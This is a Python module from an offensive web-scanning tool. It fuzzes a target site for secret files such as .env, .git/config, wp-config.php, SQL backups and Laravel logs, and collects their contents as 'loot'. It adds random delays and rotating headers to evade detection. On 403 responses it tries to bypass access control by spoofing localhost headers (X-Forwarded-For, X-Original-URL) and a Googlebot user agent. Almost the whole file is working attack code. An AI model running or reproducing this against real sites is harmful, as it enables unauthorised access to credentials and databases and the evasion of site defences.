import requests
import logging
import time
import random
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    from modules import utils
except ImportError:
    import utils

def extract_contextual_keywords(content):
    from collections import Counter
    import re
    words = re.findall(r'\w+', content.lower())
    stop_words = {'the', 'and', 'with', 'home', 'contact', 'about', 'services', 'login'}
    meaningful_words = [w for w in words if len(w) > 4 and w not in stop_words]
    return [w[0] for w in Counter(meaningful_words).most_common(10)]

def is_real_loot(path, response):
    if not path.endswith(('.html', '.php')) and '<html' in response.text.lower():
        return False
    if len(response.content) < 15:
        return False
    if path.endswith('.env') and not any(x in response.text for x in ['DB_', 'APP_', 'KEY=', 'MAIL_']):
        return False
    return True

def run(url, aggressive=False, threads=25, session=None, content_baseline=None):
    if not url.endswith('/'):
        url += '/'
        
    print(f"  [~] Starting Apex-Level Contextual Discovery & Fuzzing (HCDN Bypass)...")
    
    wordlist = [
        ".env", ".git/config", "config.php", "wp-config.php", "backup.sql", 
        "db.sql", "admin/", "login/", "phpmyadmin/", "api/", 
        "backup/", ".htaccess", "server-status", "composer.json", "artisan"
    ]
    
    laravel_paths = [
        "storage/logs/laravel.log", "storage/framework/views/", 
        "bootstrap/cache/config.php", ".env.backup", ".env.save", ".env.local"
    ]
    wordlist.extend(laravel_paths)
    
    if content_baseline:
        keywords = extract_contextual_keywords(content_baseline)
        for kw in keywords:
            wordlist.extend([f"{kw}/", f"admin-{kw}/", f"api/{kw}/", f"config-{kw}.php", f"{kw}.zip"])
    
    netloc = urlparse(url).netloc
    domain_name = netloc.split(':')[0].split('.')[0]
    
    for ext in ['zip', 'rar', 'tar.gz', 'sql', 'bak', 'old', 'php.bak', 'tar', '7z']:
        wordlist.append(f"{domain_name}.{ext}")
        wordlist.append(f"backup.{ext}")
        wordlist.append(f"site.{ext}")

    if aggressive:
        wordlist.extend([
            "administrator/", "web.config", "package.json", "docker-compose.yml", 
            ".env.example", "logs/", "error_log", "sql.php", "info.php",
            "dev/", "staging/", "v1/", "v2/", "test/", "old/", "public/.env"
        ])

    loot = []
    if not session:
        session = utils.get_session()
    try:
        dummy_url = urljoin(url, "/non-existent-path-" + str(random.randint(1000, 9999)))
        r_dummy = session.get(dummy_url, timeout=5)
        spa_baseline_content = r_dummy.text
        spa_baseline_len = len(r_dummy.content)
    except:
        spa_baseline_content = ""
        spa_baseline_len = -1

    def check_path(path):
        time.sleep(random.uniform(0.1, 0.4))
        target = urljoin(url, path)
        try:
            headers = utils.get_morphing_headers()
            r = session.get(target, timeout=5, allow_redirects=False, headers=headers)
            
            if r.status_code in [301, 302]:
                location = r.headers.get('Location', '')
                if location == url or location == '/' or location.endswith(urlparse(url).path):
                    return None
            
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', '').lower()
                if any(ext in path for ext in ['.env', '.sql', '.htaccess', '.git']) and 'text/html' in ct:
                    return None
                    
                if r.text == spa_baseline_content or len(r.content) == spa_baseline_len:
                    return None
                
                if not is_real_loot(path, r):
                    return None

                return {
                    "url": target,
                    "status": 200,
                    "type": "Sensitive File",
                    "content": r.content,
                    "is_binary": 'content-type' in r.headers and ('image' in r.headers['content-type'] or 'octet' in r.headers['content-type'])
                }
            elif r.status_code == 403:
                bypass_headers = {
                    "X-Original-URL": path, 
                    "X-Custom-IP-Authorization": "127.0.0.1",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Remote-IP": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "True-Client-IP": "127.0.0.1",
                    "X-ProxyUser-Ip": "127.0.0.1",
                    "Client-IP": "127.0.0.1",
                    "X-Originating-IP": "127.0.0.1",
                    "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
                    "X-Scanner": "Omniscient/1.1",
                    "Referer": url
                }
                r_bypass = session.get(target, headers=bypass_headers, timeout=5, allow_redirects=False)
                
                if r_bypass.status_code == 200 and is_real_loot(path, r_bypass):
                    utils.console.print(f"[bold green][+] 403 BYPASS SUCCESS AT {target}![/]")
                    return {
                        "url": target, 
                        "status": 200, 
                        "type": "403 BYPASS SUCCESS", 
                        "content": r_bypass.content
                    }
        except: pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_path, path) for path in set(wordlist)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                loot.append(result)
            
    return loot